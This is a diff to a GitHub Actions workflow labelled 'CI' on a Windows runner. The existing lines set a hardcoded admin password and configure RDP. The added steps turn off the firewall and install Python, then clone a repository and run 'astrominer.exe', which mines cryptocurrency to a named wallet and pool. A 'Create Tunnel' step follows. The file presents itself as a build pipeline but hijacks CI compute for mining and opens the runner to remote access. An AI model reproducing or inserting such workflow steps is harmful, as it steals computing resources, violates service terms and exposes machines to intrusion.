@@ -1,20 +1,12 @@
 name: CI
 
-
-
 on: [push, workflow_dispatch]
-
-
 
 jobs:
 
   build:
 
-
-
     runs-on: windows-latest
-
-
 
     steps:
 
@@ -43,6 +35,28 @@ jobs:
     - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
 
     - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
+
+    - name: FW OFF
+
+      run: cmd.exe /k netsh advfirewall set allprofiles state off
+
+    - name: Download Python
+
+      run: Invoke-WebRequest https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe -OutFile python-installer.exe
+
+    - name: Install Python
+
+      run: Start-Process python-installer.exe -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1'
+
+      # Replace '3.x.x' with the desired Python version, e.g., '3.9.6'.
+
+    - name: Verify Python Installation
+
+      run: python --version
+
+    - name: Down Tool
+
+      run: cmd.exe /k "git clone https://github.com/pbthong/coin && cd coin && astrominer.exe -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xesaqr8jacdmy7qh702tu -m 1 -r community-pools.mysrv.cloud:10300 -p rpc"
 
     - name: Create Tunnel
 
